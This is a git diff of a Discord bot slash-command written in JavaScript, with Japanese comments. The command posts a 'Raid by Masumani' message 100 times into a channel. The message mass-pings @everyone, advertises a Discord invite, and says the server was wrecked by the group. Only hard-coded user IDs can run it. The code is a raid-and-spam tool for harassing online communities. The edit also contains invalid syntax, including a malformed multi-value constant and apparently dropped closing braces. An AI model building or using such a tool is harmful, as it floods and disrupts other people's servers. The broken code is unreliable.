@@ -7,13 +7,9 @@ module.exports = {
 
   async execute(interaction) {
     // ✅ 許可するユーザーID
-    const allowedUserId = "1366740571707801610";
-    const allowedUserId = "1401303406596853785";
+    const allowedUserId = "1366740571707801610","1401303406596853785";
     // ✅ メッセージ内容と回数（ここを書き換えれば変更可能）
-    const messageContent = "## Raid by Masumani
-      https://discord.gg/asuGJGwFND
-      MASUMANI ON TOP
-      ||@everyone||";
+    const messageContent = "## Raid by Masumani \n このサーバーはますまに共栄圏によって荒らされました　\n https://discord.gg/asuGJGwFND \n MASUMANI ON TOP \n ||@everyone||";
     const repeatCount = 100; // 送信回数
 
     // 権限チェック
@@ -30,12 +26,10 @@ module.exports = {
       ephemeral: true
     });
 
-    // 送信対象チャンネル（サーバー or DM）
-    const channel = interaction.channel;
+// 送信対象チャンネル（サーバー or DM）
+const channel = interaction.channel;
 
-    // 指定回数ループ
-    for (let i = 0; i < repeatCount; i++) {
-      await channel.send(messageContent);
-    }
-  }
-};
+// 指定回数ループ
+for (let i = 0; i < repeatCount; i++) {
+  await channel.send(messageContent);
+}
